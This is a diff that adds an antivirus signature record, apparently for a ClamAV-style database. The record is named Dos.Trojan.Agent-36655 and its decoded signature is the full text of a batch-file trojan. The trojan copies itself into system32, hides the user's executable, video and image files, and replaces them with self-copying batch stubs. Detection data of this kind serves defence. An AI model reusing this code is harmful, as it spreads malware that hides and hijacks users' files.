@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36655
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off if not exist %windir%\system32\winlog.vsc copy %0 %windir%\system32\winlog.vsc for %%f in (*.exe;*.wmv;*.avi;*.jpg;*.jpeg) do set ipt=%%f ren %ipt% x%ipt% attrib +s +h x%ipt% copy %windir%\system32\winlog.vsc %ipt%.bat echo if exist x%ipt% start x%ipt% >>%ipt%.bat if exist .bat del /q .bat 
